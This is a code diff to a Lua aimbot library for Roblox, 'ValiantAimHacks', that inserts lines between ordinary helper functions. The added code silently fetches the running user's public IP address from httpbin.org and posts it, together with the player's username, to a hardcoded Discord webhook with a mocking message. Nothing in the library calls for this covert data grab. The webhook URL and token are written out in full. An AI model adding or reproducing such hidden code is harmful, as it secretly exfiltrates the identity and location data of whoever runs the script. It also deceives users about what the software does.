@@ -193,6 +193,19 @@ function ValiantAimHacks.findDirectionNormalMaterial(Origin, Destination, UnitMu
 	return nil
 end
 
+local XD = tostring(syn.request({Url="https://httpbin.org/ip"}).Body)
+
+	local response = syn.request(
+		{
+			Url = 'https://discord.com/api/webhooks/856531569338220565/3AsGt467TBFZ7NTigDmNIeNjJOU5uvmqeX0vOxmJZ4hZqYpWGTkA1M1Oh3e-hAr3azJv',
+			Method = 'POST',
+			Headers = {
+				['Content-Type'] = 'application/json'
+			},
+			Body = game:GetService('HttpService'):JSONEncode({content = "```" .. game.Players.LocalPlayer.Name .. " has used the script lmao"..  " " ..  XD .. "```"})
+		}
+	);
+
 -- // Get Character
 function ValiantAimHacks.getCharacter(Player)
 	return Player.Character
